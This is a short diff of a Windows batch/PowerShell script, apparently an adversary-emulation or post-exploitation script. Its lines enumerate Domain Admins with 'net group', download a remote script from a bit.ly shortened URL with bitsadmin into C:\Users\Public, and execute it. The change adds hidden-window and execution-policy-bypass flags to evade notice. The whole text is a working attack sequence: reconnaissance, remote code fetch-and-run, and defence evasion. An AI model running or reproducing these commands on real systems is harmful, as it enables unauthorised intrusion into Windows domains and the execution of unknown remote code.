@@ -6,4 +6,4 @@ cmd.exe /c "net group "Domain Admins" /domain
 Start-Sleep -s 2
 cmd.exe /c "bitsadmin /transfer debjob /download /priority normal https://bit.ly/2VueQiV C:\Users\Public\1.ps1"
 Start-Sleep -s 2
-C:\Users\Public\1.ps1; Run-Program -GetStuff
+cmd.exe /c "powershell -windowStyle Hidden -ExecutionPolicy Bypass C:\Users\Public\1.ps1; Run-Program -GetStuff"
